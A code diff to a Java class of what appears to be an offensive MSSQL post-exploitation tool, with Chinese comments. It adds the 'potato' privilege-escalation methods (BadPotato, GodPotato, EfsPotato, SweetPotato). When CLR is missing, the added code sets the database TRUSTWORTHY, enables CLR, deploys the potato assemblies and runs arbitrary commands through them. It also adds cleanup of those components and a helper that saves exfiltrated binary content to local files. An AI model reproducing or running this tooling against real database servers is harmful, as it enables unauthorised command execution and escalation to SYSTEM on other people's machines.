@@ -84,7 +84,21 @@ public class MssqlDispatcher extends BaseDispatcher {
             }
             if ("badpotato".equals(method) || "godpotato".equals(method) || "efspotato".equals(method)
                     || "efspotato_shellcode".equals(method) || "sweetpotato".equals(method)) {
-                return m3a("exec --method " + method, dbType()).withId(id);
+                // D12 管道（与 Extend CLI 对齐）：kitmain CLR 链前置 → 部署对应程序集/过程 → exec kitX '<cmd>'
+                if (!dao.checkCLR()) {
+                    dao.setTrustworthy(rec.get("database"), "on");
+                    dao.activateCLR();
+                    dao.initCLR();
+                    dao.createCLRFunc();
+                }
+                if (!dao.checkPotatoFunc(method)) {
+                    if (!dao.createPotatoFunc(method)) {
+                        return Result.target(method + " 部署失败（详见 stderr）",
+                                "确认 sysadmin 权限与 CLR 可用；资产 Plugins/Mssql/" + MssqlDao.potatoAsset(method) + " 是否随包分发").withId(id);
+                    }
+                }
+                String res = dao.runPotatoCmd(method, cmd, code);
+                return Result.ok(res == null ? "" : res).withId(id);
             }
             return Result.usage("未知 --method: " + method,
                     "可用: xpcmdshell|oap|agent|clr|badpotato|godpotato|efspotato|efspotato_shellcode|sweetpotato").withId(id);
@@ -95,7 +109,8 @@ public class MssqlDispatcher extends BaseDispatcher {
         }
         if ("recovery".equals(tool)) {
             dao.recoveryAll();
-            return Result.ok("recovery 完成（组件一键恢复）").withId(id);
+            dao.closeAllPotato();
+            return Result.ok("recovery 完成（组件一键恢复 + potato 系卸载）").withId(id);
         }
         if ("deploy".equals(tool)) {
             String comp = flag(p, "component", "clr");
@@ -190,6 +205,30 @@ public class MssqlDispatcher extends BaseDispatcher {
             d.put("hint", "内容超过 64KB，请用 download --out 直存本地");
         }
         return Result.ok(content, d);
+    }
+
+    /** 二进制直存（mysql/pg 的 hex 通道用）：--out 直写本地；无 --out 时小内容 b64 进信封 */
+    static Result toOutBytes(Ctx ctx, byte[] bytes, String outPath) throws Exception {
+        JSONObject d = new JSONObject();
+        if (outPath != null && !outPath.isEmpty()) {
+            File out = new File(outPath);
+            File parent = out.getAbsoluteFile().getParentFile();
+            if (parent != null && !parent.isDirectory() && !parent.mkdirs()) {
+                return Result.target("本地目录创建失败: " + parent, "检查 --out 路径");
+            }
+            FileOutputStream fos = new FileOutputStream(out);
+            try {
+                fos.write(bytes);
+            } finally {
+                fos.close();
+            }
+            d.put("out", out.getAbsolutePath());
+            d.put("size", bytes.length);
+            return Result.ok("已保存 " + out.getAbsolutePath() + " (" + bytes.length + " bytes)", d);
+        }
+        d.put("b64", java.util.Base64.getEncoder().encodeToString(bytes));
+        d.put("size", bytes.length);
+        return Result.ok(new String(bytes, java.nio.charset.StandardCharsets.UTF_8), d);
     }
 
     /** download 的 --out 直存（大文件纪律：内容不进信封） */
